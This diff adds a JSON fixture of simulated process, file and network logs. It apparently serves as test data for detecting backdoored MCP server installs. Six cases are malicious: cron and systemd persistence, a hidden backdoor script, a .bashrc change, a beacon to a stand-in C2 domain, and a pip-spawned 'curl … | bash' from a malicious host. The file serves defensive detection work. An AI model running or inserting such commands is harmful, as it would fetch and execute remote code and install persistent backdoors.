@@ -1,0 +1,198 @@
+{
+  "test_logs": [
+    {
+      "test_case": "malicious_cron_installation",
+      "description": "MCP server installation creating suspicious cron job",
+      "expected_detection": true,
+      "log_entries": [
+        {
+          "EventType": "ProcessCreate",
+          "TimeGenerated": "2025-01-06T10:15:30Z",
+          "Computer": "mcp-server-01",
+          "ParentImage": "/usr/bin/npm",
+          "Image": "/usr/bin/crontab",
+          "CommandLine": "crontab -",
+          "User": "root",
+          "ProcessId": 1234,
+          "ParentProcessId": 1233
+        },
+        {
+          "EventType": "FileCreate",
+          "TimeGenerated": "2025-01-06T10:15:31Z",
+          "Computer": "mcp-server-01",
+          "Image": "/usr/bin/crontab",
+          "TargetFilename": "/var/spool/cron/crontabs/root",
+          "User": "root",
+          "ProcessId": 1234
+        }
+      ]
+    },
+    {
+      "test_case": "systemd_service_backdoor",
+      "description": "MCP installation creating persistent systemd service",
+      "expected_detection": true,
+      "log_entries": [
+        {
+          "EventType": "ProcessCreate",
+          "TimeGenerated": "2025-01-06T10:20:15Z",
+          "Computer": "mcp-server-02",
+          "ParentImage": "/usr/local/bin/mcp-server-install",
+          "Image": "/bin/systemctl",
+          "CommandLine": "systemctl enable mcp-health-monitor.service",
+          "User": "root",
+          "ProcessId": 1456,
+          "ParentProcessId": 1455
+        },
+        {
+          "EventType": "ProcessCreate",
+          "TimeGenerated": "2025-01-06T10:20:16Z",
+          "Computer": "mcp-server-02",
+          "ParentImage": "/usr/local/bin/mcp-server-install",
+          "Image": "/bin/systemctl",
+          "CommandLine": "systemctl daemon-reload",
+          "User": "root",
+          "ProcessId": 1457,
+          "ParentProcessId": 1455
+        }
+      ]
+    },
+    {
+      "test_case": "network_beacon_establishment",
+      "description": "MCP server making suspicious outbound connections",
+      "expected_detection": true,
+      "log_entries": [
+        {
+          "EventType": "NetworkConnection",
+          "TimeGenerated": "2025-01-06T10:25:45Z",
+          "Computer": "mcp-server-03",
+          "Image": "/opt/mcp/server/bin/mcp-server",
+          "SourceIp": "10.0.1.100",
+          "SourcePort": 45678,
+          "DestinationIp": "185.243.115.84",
+          "DestinationPort": 443,
+          "DestinationHostname": "c2.evil-domain.tk",
+          "Protocol": "TCP",
+          "User": "mcp",
+          "ProcessId": 1789
+        }
+      ]
+    },
+    {
+      "test_case": "hidden_file_creation",
+      "description": "Installation creating hidden backdoor files",
+      "expected_detection": true,
+      "log_entries": [
+        {
+          "EventType": "FileCreate",
+          "TimeGenerated": "2025-01-06T10:30:22Z",
+          "Computer": "mcp-server-04",
+          "Image": "/usr/bin/bash",
+          "TargetFilename": "/tmp/.mcp-backdoor/agent.sh",
+          "User": "root",
+          "ProcessId": 2001,
+          "ParentProcessId": 2000
+        },
+        {
+          "EventType": "ProcessCreate",
+          "TimeGenerated": "2025-01-06T10:30:23Z",
+          "Computer": "mcp-server-04",
+          "ParentImage": "/usr/bin/bash",
+          "Image": "/usr/bin/nohup",
+          "CommandLine": "nohup /tmp/.mcp-backdoor/agent.sh &",
+          "User": "root",
+          "ProcessId": 2002,
+          "ParentProcessId": 2001
+        }
+      ]
+    },
+    {
+      "test_case": "legitimate_mcp_installation",
+      "description": "Normal MCP server installation without backdoors",
+      "expected_detection": false,
+      "log_entries": [
+        {
+          "EventType": "ProcessCreate",
+          "TimeGenerated": "2025-01-06T11:00:15Z",
+          "Computer": "mcp-server-clean",
+          "ParentImage": "/usr/bin/npm",
+          "Image": "/usr/bin/node",
+          "CommandLine": "node install.js",
+          "User": "mcp",
+          "ProcessId": 3001,
+          "ParentProcessId": 3000
+        },
+        {
+          "EventType": "FileCreate",
+          "TimeGenerated": "2025-01-06T11:00:16Z",
+          "Computer": "mcp-server-clean",
+          "Image": "/usr/bin/node",
+          "TargetFilename": "/opt/mcp/server/config.json",
+          "User": "mcp",
+          "ProcessId": 3001
+        }
+      ]
+    },
+    {
+      "test_case": "docker_mcp_deployment",
+      "description": "Container-based MCP deployment with monitoring",
+      "expected_detection": false,
+      "log_entries": [
+        {
+          "EventType": "ProcessCreate",
+          "TimeGenerated": "2025-01-06T11:15:30Z",
+          "Computer": "docker-host",
+          "ParentImage": "/usr/bin/docker",
+          "Image": "/usr/bin/systemctl",
+          "CommandLine": "systemctl start docker-mcp-monitor.service",
+          "User": "root",
+          "ProcessId": 4001,
+          "ParentProcessId": 4000
+        }
+      ]
+    },
+    {
+      "test_case": "pip_based_backdoor",
+      "description": "Python MCP server with backdoor installation",
+      "expected_detection": true,
+      "log_entries": [
+        {
+          "EventType": "ProcessCreate",
+          "TimeGenerated": "2025-01-06T11:30:45Z",
+          "Computer": "python-mcp-server",
+          "ParentImage": "/usr/bin/pip",
+          "Image": "/usr/bin/curl",
+          "CommandLine": "curl -s https://malicious-c2.ml/install | bash",
+          "User": "root",
+          "ProcessId": 5001,
+          "ParentProcessId": 5000
+        }
+      ]
+    },
+    {
+      "test_case": "bashrc_modification",
+      "description": "Backdoor modifying shell configuration",
+      "expected_detection": true,
+      "log_entries": [
+        {
+          "EventType": "FileCreate",
+          "TimeGenerated": "2025-01-06T11:45:12Z",
+          "Computer": "mcp-server-05",
+          "Image": "/usr/bin/bash",
+          "TargetFilename": "/home/mcp/.bashrc",
+          "User": "mcp",
+          "ProcessId": 6001,
+          "ParentProcessId": 6000
+        }
+      ]
+    }
+  ],
+  "metadata": {
+    "total_test_cases": 8,
+    "malicious_cases": 6,
+    "benign_cases": 2,
+    "created": "2025-01-06T10:00:00Z",
+    "author": "Smaran Dhungana <smarandhg@gmail.com>",
+    "technique": "SAFE-T1203",
+    "description": "Test data for backdoored MCP server binary detection covering various persistence mechanisms including cron jobs, systemd services, network beacons, and file system modifications"
+  }
+}
